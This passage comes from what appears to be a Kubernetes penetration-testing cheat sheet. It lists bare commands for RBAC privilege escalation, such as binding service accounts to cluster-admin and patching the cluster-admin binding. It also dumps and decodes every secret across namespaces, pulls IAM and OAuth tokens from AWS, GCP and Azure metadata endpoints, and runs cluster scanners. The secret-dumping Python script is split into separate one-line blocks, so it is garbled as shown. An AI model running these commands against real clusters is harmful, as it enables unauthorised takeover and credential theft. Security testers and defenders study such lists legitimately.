<!-- section: {"id":"0t39i7y41mptl7a5i","order":8,"collapsed":false} -->

### 4fitkhoncmptl7aoh
```bash
kubectl get clusterrolebinding -o json | python3 -m json.tool | grep -A5 "cluster-admin"
```

_RBAC Abuse_

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"4fitkhoncmptl7aoh","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

### svm08x5gvmptl7aop
```bash
kubectl create serviceaccount privesc
```

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"svm08x5gvmptl7aop","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

### lgkslkh38mptl7aou
```bash
kubectl create clusterrolebinding privesc --clusterrole=cluster-admin --serviceaccount=default:privesc
```

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"lgkslkh38mptl7aou","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

### gda8wl5p5mptl7aoz
```bash
kubectl --as=system:admin get pods
```

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"gda8wl5p5mptl7aoz","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

### cunkhuo2kmptl7ap6
```bash
kubectl create rolebinding pwn --clusterrole=cluster-admin --serviceaccount=default:default
```

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"cunkhuo2kmptl7ap6","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

### juoilkfbbmptl7apd
```bash
kubectl patch clusterrolebinding cluster-admin -p '{"subjects":[{"kind":"ServiceAccount","name":"default","namespace":"default"}]}'
```

**Tags:** kubernetes, rbac, privesc, exploitation
<!-- cmd: {"id":"juoilkfbbmptl7apd","language":"bash","sectionId":"0t39i7y41mptl7a5i","tags":["kubernetes","rbac","privesc","exploitation"]} -->

## Secrets & Credential Hunting
<!-- section: {"id":"dvfk4jhe3mptl7a5n","order":9,"collapsed":false} -->

### 225llp7gjmptl7apr
```bash
kubectl get secrets --all-namespaces -o json | python3 -c "
```

_Secrets & Credential Hunting_

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"225llp7gjmptl7apr","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### q7wzv3dl4mptl7apx
```bash
import sys, json, base64
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"q7wzv3dl4mptl7apx","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### 5so3i6qfjmptl7aq4
```bash
d = json.load(sys.stdin)
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"5so3i6qfjmptl7aq4","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### luy2ef7admptl7aqa
```bash
for item in d['items']:
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"luy2ef7admptl7aqa","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### vpypnll3fmptl7aqg
```bash
ns = item['metadata']['namespace']
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"vpypnll3fmptl7aqg","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### spzs03qipmptl7aqm
```bash
name = item['metadata']['name']
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"spzs03qipmptl7aqm","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### zjqxon2cumptl7aqr
```bash
data = item.get('data', {})
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"zjqxon2cumptl7aqr","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### 8ka0uoy4lmptl7aqy
```bash
for k, v in data.items():
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"8ka0uoy4lmptl7aqy","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### 2o4022sgrmptl7ar4
```bash
try:
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"2o4022sgrmptl7ar4","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### y0w4yxw8gmptl7ara
```bash
print(f'{ns}/{name}/{k}: {base64.b64decode(v).decode()}')
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"y0w4yxw8gmptl7ara","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### wd3rpm28tmptl7arf
```bash
except: pass
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"wd3rpm28tmptl7arf","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### a1340d7qhmptl7arl
```bash
"
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"a1340d7qhmptl7arl","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### 3q6e618vwmptl7arr
```bash
kubectl get configmaps --all-namespaces -o json | grep -i "pass\|secret\|token\|key"
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"3q6e618vwmptl7arr","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### tngs14lclmptl7arx
```bash
kubectl get pods --all-namespaces -o json | python3 -m json.tool | grep -i "value\|name" | grep -i "pass\|secret\|key\|token"
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"tngs14lclmptl7arx","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

### wog02meiomptl7as7
```bash
kubectl get secrets --all-namespaces --field-selector type=kubernetes.io/dockerconfigjson -o json
```

**Tags:** kubernetes, secrets, credentials, hunting
<!-- cmd: {"id":"wog02meiomptl7as7","language":"bash","sectionId":"dvfk4jhe3mptl7a5n","tags":["kubernetes","secrets","credentials","hunting"]} -->

## Cloud Metadata from Pod
<!-- section: {"id":"q0u5qf0v2mptl7a5t","order":10,"collapsed":false} -->

### lyb87klt5mptl7asw
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

_Cloud Metadata from Pod_

**Tags:** kubernetes, cloud, metadata, aws, gcp, azure
<!-- cmd: {"id":"lyb87klt5mptl7asw","language":"bash","sectionId":"q0u5qf0v2mptl7a5t","tags":["kubernetes","cloud","metadata","aws","gcp","azure"]} -->

### u886pqupymptl7at1
```bash
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE
```

**Tags:** kubernetes, cloud, metadata, aws, gcp, azure
<!-- cmd: {"id":"u886pqupymptl7at1","language":"bash","sectionId":"q0u5qf0v2mptl7a5t","tags":["kubernetes","cloud","metadata","aws","gcp","azure"]} -->

### 1bxrkbzxwmptl7at7
```bash
curl -s "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
```

**Tags:** kubernetes, cloud, metadata, aws, gcp, azure
<!-- cmd: {"id":"1bxrkbzxwmptl7at7","language":"bash","sectionId":"q0u5qf0v2mptl7a5t","tags":["kubernetes","cloud","metadata","aws","gcp","azure"]} -->

### b2p9s6g0umptl7ate
```bash
curl -s "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" -H "Metadata:true"
```

**Tags:** kubernetes, cloud, metadata, aws, gcp, azure
<!-- cmd: {"id":"b2p9s6g0umptl7ate","language":"bash","sectionId":"q0u5qf0v2mptl7a5t","tags":["kubernetes","cloud","metadata","aws","gcp","azure"]} -->

## Tools — Automated
<!-- section: {"id":"xug3e35kmmptl7a5z","order":11,"collapsed":false} -->

### o2gt85vk2mptl7au0
```bash
kube-hunter --remote $TARGET
```

_Tools — Automated_

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"o2gt85vk2mptl7au0","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

### bb7rtwix3mptl7au6
```bash
kube-hunter --network 10.0.0.0/24
```

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"bb7rtwix3mptl7au6","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

### 34zo5sr6kmptl7aud
```bash
kube-bench
```

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"34zo5sr6kmptl7aud","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

### nrzfdp0u5mptl7aui
```bash
trivy k8s --report summary cluster
```

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"nrzfdp0u5mptl7aui","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

### kjqlw8whfmptl7aum
```bash
kubeaudit all
```

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"kjqlw8whfmptl7aum","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

### 4acl6c0womptl7aus
```bash
peirates
```

**Tags:** kubernetes, tools, automated, scanning
<!-- cmd: {"id":"4acl6c0womptl7aus","language":"bash","sectionId":"xug3e35kmmptl7a5z","tags":["kubernetes","tools","automated","scanning"]} -->

## Common Misconfigurations
<!-- section: {"id":"sys7m202umptl7a64","order":12,"collapsed":false} -->

### tc3wys8y3mptl7ava
```bash
curl -sk https://$TARGET:6443/api/v1/namespaces
```

_Common Misconfigurations_

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"tc3wys8y3mptl7ava","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### elxkbxvd8mptl7avg
```bash
curl -sk https://$TARGET:10250/pods
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"elxkbxvd8mptl7avg","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### hl19chzo6mptl7avl
```bash
kubectl auth can-i '*' '*'
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"hl19chzo6mptl7avl","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### 9tqln86bkmptl7avp
```bash
kubectl get pods --all-namespaces -o json | python3 -m json.tool | grep '"privileged": true'
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"9tqln86bkmptl7avp","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### pkpw9con7mptl7avu
```bash
kubectl get pods --all-namespaces -o json | grep '"path": "/"'
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"pkpw9con7mptl7avu","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### keh7u0gn4mptl7avz
```bash
kubectl describe clusterrolebinding | grep "default"
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"keh7u0gn4mptl7avz","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->

### idcrcjegqmptl7aw5
```bash
grep "encryption" /etc/kubernetes/manifests/kube-apiserver.yaml
```

**Tags:** kubernetes, misconfiguration, hardening
<!-- cmd: {"id":"idcrcjegqmptl7aw5","language":"bash","sectionId":"sys7m202umptl7a64","tags":["kubernetes","misconfiguration","hardening"]} -->
